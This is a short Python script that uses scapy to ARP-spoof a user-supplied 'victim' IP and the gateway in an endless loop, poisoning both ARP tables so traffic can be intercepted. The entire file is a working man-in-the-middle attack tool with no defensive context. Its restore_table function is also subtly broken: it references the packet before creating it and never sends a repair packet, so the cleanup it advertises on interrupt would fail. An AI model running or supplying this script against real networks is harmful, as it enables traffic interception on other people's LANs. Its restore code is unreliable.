#!/usr/bin/python3

import scapy.all as scapy
import time 
import sys 

# function for getting the mac address 
def mac_address(ip_address): 
    arp_request = scapy.ARP(pdst = ip_address) # creating an arp request with whatever ip is inputted
    br = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # setting the broadcast mac address to ff:ff... using the Ether function
    arp_request_br = br / arp_request # joining the mac address and the request into a single packet
    answers = scapy.srp(arp_request_br, timeout=5, verbose=False)[0] # list of ip addreses that responded and that didn't respond
    return answers[0][1].hwsrc # returning the answer list 

# function for spoofing 
def spoof(target_ip, spoof_ip): 
    # making a packet that modifies the ARP table of our victim and the gateway
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address(target_ip), 
                                                                psrc=spoof_ip) 
    scapy.send(packet, verbose=False)

def restore_table(dest_ip, source_ip):
    dest_mac = mac_address(dest_ip)
    source_mac = mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=scapy.send(packet, verbose=True))

target_ip = input("> Victim IP: ")
gateway_ip = input("> Gateway IP: ")

try: 
    packets_sent = 0 
    while True: 
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent = packets_sent + 2
        print("> Total Packets Sent: " + str(packets_sent))
        time.sleep(1)
except KeyboardInterrupt: 
    print("> Program Interrupted")
    restore_table(gateway_ip, target_ip)
    restore_table(target_ip, gateway_ip)
    print("> Attack stopped")
